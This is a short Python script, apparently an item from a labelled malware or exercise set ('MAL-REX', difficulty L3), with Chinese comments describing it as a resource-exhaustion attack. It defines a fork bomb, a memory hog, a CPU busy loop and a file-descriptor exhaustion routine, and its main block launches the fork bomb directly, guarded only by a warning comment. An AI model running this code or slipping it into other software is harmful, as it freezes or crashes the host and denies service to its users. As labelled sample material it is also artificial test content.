#!/usr/bin/env python3
# MAL-REX-53ee51 - 资源耗尽攻击
# 难度：L3 | 语言：Python

import os
import sys

# 方案 1: Fork 炸弹
def fork_bomb():
    while True:
        os.fork()

# 方案 2: 内存耗尽
def memory_hog():
    data = []
    while True:
        data.append('x' * 1024 * 1024)  # 每次分配 1MB

# 方案 3: CPU 耗尽
def cpu_hog():
    while True:
        pass  # 无限循环占用 CPU

# 方案 4: 文件描述符耗尽
def fd_exhaust():
    files = []
    while True:
        try:
            files.append(open('/dev/null', 'r'))
        except:
            break

# 执行攻击（根据难度选择）
if __name__ == '__main__':
    fork_bomb()  # 危险！仅在隔离环境测试
